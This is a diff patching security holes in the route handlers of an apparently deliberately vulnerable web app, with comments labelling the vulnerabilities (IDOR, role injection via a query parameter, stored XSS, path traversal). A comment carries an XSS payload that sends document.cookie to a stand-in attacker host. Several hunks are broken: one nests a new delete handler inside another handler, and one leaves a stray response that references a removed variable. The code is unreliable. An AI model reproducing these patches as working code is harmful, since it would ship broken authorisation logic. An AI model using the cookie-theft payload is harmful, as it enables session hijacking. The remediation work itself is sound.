@@ -1562,6 +1562,16 @@ export async function registerRoutes(
       if (!job) return res.status(404).json({ message: "Not found" });
       if (job.userId !== callerUserId) return res.status(403).json({ message: "Forbidden" });
       await storage.deleteScanJob(job.id);
+  // Only the owning user can delete a scheduled scan job.
+  app.delete("/api/scans/:id", requireAuth, async (req: any, res) => {
+    try {
+      const callerId: number = req.sentinelUser?.userId;
+      const id = parseInt(req.params.id);
+      const job = await storage.getScanJob(id);
+      if (!job) return res.status(404).json({ message: "Not found" });
+      if (job.userId !== callerId) return res.status(403).json({ message: "Forbidden" });
+
+      await storage.deleteScanJob(id);
       res.json({ message: "Job deleted." });
     } catch (e: any) { res.status(500).json({ message: e.message }); }
   });
@@ -1597,13 +1607,15 @@ export async function registerRoutes(
   });
 
   // VULN #47 (GET /api/workspaces/:id/members): IDOR — list members of any workspace.
-  app.get("/api/workspaces/:id/members", async (req, res) => {
+  app.get("/api/workspaces/:id/members", requireAuth, async (req, res) => {
     try {
-      const members = await storage.getWorkspaceMembers(parseInt(req.params.id));
+      const workspaceId = parseInt(req.params.id);
+      const members = await storage.getWorkspaceMembers(workspaceId);
+      const callerIsMember = members.some((m: any) => m.userId === req.sentinelUser.userId);
+      if (!callerIsMember) return res.status(403).json({ message: "Forbidden" });
       res.json(members);
     } catch (e: any) { res.status(500).json({ message: e.message }); }
   });
-
   // VULN #48 (POST /api/workspaces/:id/invite):
   //   - Token generated with Math.random().toString(36) — same weakness as #13.
   //   - Intended role written to DB but POST /api/invitations/:token/accept reads ?role= from URL.
@@ -1640,9 +1652,10 @@ export async function registerRoutes(
     try {
       const { userId } = req.body;
       if (!userId) return res.status(400).json({ message: "userId required" });
-      // VULN: role read from query param, not from invitation DB record
-      const role = (req.query.role as string) ?? "viewer";
-      const inv = await storage.acceptInvitation(req.params.token, parseInt(userId), role);
+      const pendingInv = await storage.getInvitationByToken(req.params.token);
+      if (!pendingInv) return res.status(404).json({ message: "Invitation not found" });
+      const inv = await storage.acceptInvitation(req.params.token, parseInt(userId), pendingInv.role);
+      res.json({ message: `Joined workspace as ${pendingInv.role}`, invitation: inv });
       res.json({ message: `Joined workspace as ${role}`, invitation: inv });
     } catch (e: any) { res.status(500).json({ message: e.message }); }
   });
@@ -1750,6 +1763,9 @@ export async function registerRoutes(
   // Exploit: POST { title: "...", slug: "...", body: '<svg onload="fetch(\"https://attacker.io/c=\"+document.cookie)">' }
   app.post("/api/kb/articles", requireAuth, async (req: any, res) => {
     try {
+      if (req.sentinelUser?.role !== "admin") {
+        return res.status(403).json({ message: "Forbidden: admin role required" });
+      }
       const { title, slug, body, category, tags } = req.body;
       if (!title || !slug || !body) {
         return res.status(400).json({ message: "title, slug, and body are required" });
@@ -1918,7 +1934,13 @@ export async function registerRoutes(
     //   The ".pdf" suffix constrains the target filename extension, but does not
     //   sanitize directory separators.  The scanner keeps this open because the
     //   input is not validated to be numeric-only before the sink.
+    if (!/^\d+$/.test(article_id)) {
+      return res.status(400).json({ message: "Invalid article ID" });
+    }
     const filepath = path.join(EXPORT_DIR, `${article_id}.pdf`);
+    if (!filepath.startsWith(EXPORT_DIR + path.sep)) {
+      return res.status(400).json({ message: "Invalid article ID" });
+    }
 
     try {
       const file = await fs.promises.readFile(filepath);
